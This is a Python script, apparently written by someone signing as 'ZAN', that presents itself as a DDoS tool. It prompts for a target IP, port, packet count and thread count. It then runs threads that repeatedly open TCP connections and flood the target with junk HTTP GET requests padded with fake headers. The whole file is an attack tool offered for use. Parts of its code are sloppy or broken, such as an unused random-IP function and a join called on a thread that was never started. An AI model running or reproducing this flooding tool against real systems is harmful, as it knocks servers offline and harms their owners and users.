import threading
import socket, requests
import random
userip = ["""45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:8080
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443
45.68.71.21:443"""]
acceptall = [""" https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com
https://Yandex.com """]
all = [""" https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/
https://merdeka.com/ """]
print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
              |  LAYER4  |  TIME:LIFETIME |
              |  LAYER7  |   TCP:443/80   |
              |   TCP    |      UDP:17091    |
              |   UDP    |
              """)
ip = str(input("IP ATTACK>="))
ip = socket.gethostbyname(ip)
port = int(input("PORT >= "))
pack = int(input("[ ? ] how long do you want Packet/s >="))
th = int(input("[ ? ] how long do you want Thread/t >="))
def randomip():
  randip = [192, 168, 0, 1]
  randip1 = random.randint(2,255)
  randip2 = random.randint(2,255)
  randip3 = random.randint(2,255)
  randip4 = random.randint(2,255)
 
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)
  

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)

def start():
  global userip, acceptall, all
  hh = random._urandom(999999)
  xx = int(0)
  nolakall = "IpAll: "+random.choice(all)+random.choice(userip)+"\r\n"
  cekall = "Bantai: "+random.choice(all)+random.choice(userip)+random.choice(acceptall)+"\r\n"
  ipser = "IP: "+random.choice(userip)+"\r\n"
  accept = random.choice(acceptall)+"\r\n"
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_req = ipser + cekall + nolakall + content + length + accept + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_req))
            for i in range(pack):
                s.send(str.encode(main_req))
            xx += random.randint(0, int(pack))
            print("SÉRVÉR {1} CRÂSH BY ZÁN")
        except:
            s.close()
            print('[+] server error')
def attck():
    for i in range(100000):
     print(i)
attck()

for x in range(th):
    thred = threading.Thread(target=start)
    th = threading.Thread(target=attck)
    th.join()
    thred.start()
